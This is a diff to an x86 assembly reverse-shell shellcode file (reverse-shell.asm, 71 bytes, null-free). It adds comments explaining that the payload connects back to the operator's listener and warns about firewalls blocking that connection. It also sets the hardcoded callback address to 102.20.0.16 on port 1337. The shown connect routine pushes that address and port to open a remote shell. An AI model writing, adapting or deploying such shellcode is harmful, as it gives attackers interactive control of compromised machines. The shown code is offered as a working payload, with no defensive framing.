@@ -1,5 +1,9 @@
 ; Leander Metcalf
 ; 23 November 2014
+; 
+; This shellcode will attempt to callback to your socket pair.
+; Make sure that your firewall isn't blocking its attempts to
+; connect back to you.
 ;
 ; nasm -f bin reverse-shell.asm
 ; 71 Bytes with zero nulls or carriage returns
@@ -35,7 +39,7 @@ add	esp, 12
 
 connect:
 xchg	edi, eax
-push	dword 0x66140010	;IP 0.0.0.0
+push	dword 0x66140010	;IP 102.20.0.16
 push	word 0x3905	;port: 1337
 inc	ebx
 push	bx
